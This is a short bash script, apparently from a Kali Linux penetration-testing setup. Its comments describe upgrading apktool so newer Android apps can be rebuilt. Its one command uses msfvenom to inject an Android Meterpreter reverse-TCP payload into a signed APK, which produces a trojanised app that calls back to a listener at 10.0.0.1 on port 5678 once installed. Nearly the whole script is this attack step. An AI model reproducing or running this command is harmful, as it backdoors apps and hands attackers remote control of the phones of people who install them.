#!/bin/bash
# note: The latest APKs (Build Tools > 26.0.2, Aapt2) couldn't be rebuild with apktool 2.3.0-dirty
# which ships with current kali
# thus version 2.3.1 was cloned from the source (git clone git://github.com/iBotPeaches/Apktool.git)
# compiled on kali and /usr/share/apktool/apktool.jar replaced by the resulting package



# inject payload to apk
msfvenom -x app-release-signed-aligned.apk -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=5678 -o app.apk
